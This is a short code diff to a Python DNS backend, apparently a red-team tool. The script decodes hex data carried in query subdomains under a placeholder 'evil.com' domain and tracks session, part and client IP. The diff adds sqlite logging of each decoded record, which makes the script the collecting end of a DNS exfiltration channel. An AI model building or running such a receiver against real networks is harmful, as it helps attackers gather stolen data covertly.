@@ -10,6 +10,8 @@ Current Author and Maintainer: GuM0x
 
 from sys import stdin, stdout, stderr
 from datetime import date, datetime, time
+import sqlite3
+
 
 # Basic configuration
 domain = "evil.com"
@@ -18,6 +20,9 @@ ipaddress = "10.22.3.68"
 ids = "1"
 hostmaster="crazy-gamusino@narnia.net"
 soa = '%s %s %s' % ("ns1." + domain, hostmaster, ids)
+
+conn = sqlite3.connect('bribon.db')
+
 
 # Read STDIN and split tokens
 def readLine():
@@ -53,7 +58,10 @@ def getData(qname, clientip):
         	data = encoded.decode('hex')
 		part = domainArr[1]
         	session = domainArr[2]
-		printErr("DATA -> %s[%s].%s: %s\n" % (clientip, session, part, data))	   
+		printErr("DATA -> %s[%s].%s: %s\n" % (clientip, session, part, data,))	   
+		now_str = datetime.now().strftime('%Y-%m-%d %H%M%S')
+		conn.execute("INSERT INTO queries VALUES(?,?,?,?,?,?)",(now_str, data, part, session, clientip, domain))
+		conn.commit()
 	else:
 	    printErr("ERROR\n")
             stderr.flush()
